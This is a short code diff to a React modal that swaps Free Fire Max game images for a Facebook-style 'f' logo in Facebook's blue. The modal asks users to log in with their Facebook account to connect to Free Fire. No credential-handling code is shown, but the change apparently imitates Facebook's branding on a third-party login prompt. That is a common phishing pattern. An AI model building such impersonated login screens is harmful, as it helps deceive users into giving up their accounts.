@@ -169,18 +169,11 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 
                 {item && (
                   <div className="text-center space-y-4 mb-6">
-                    <img 
-                      src="/lovable-uploads/ac0404fb-3013-45c8-ad12-1276cfa0a853.png" 
-                      alt="Free Fire Max Logo"
-                      className="w-16 h-16 mx-auto object-contain"
-                    />
-                    <img 
-                      src="/lovable-uploads/4f91603b-f47a-4f78-82c8-8d927a08d195.png" 
-                      alt="Free Fire Max Game"
-                      className="w-32 h-20 mx-auto object-cover rounded-lg"
-                    />
+                    <div className="w-16 h-16 mx-auto bg-[#1877f2] rounded-full flex items-center justify-center">
+                      <span className="text-white text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>f</span>
+                    </div>
                     <h3 className="font-normal text-gray-900">{item.name}</h3>
-                    <p className="text-sm text-gray-600">
+                    <p className="text-sm text-gray-600 font-normal" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                       Log in your Facebook account to connect to Free Fire.
                     </p>
                   </div>
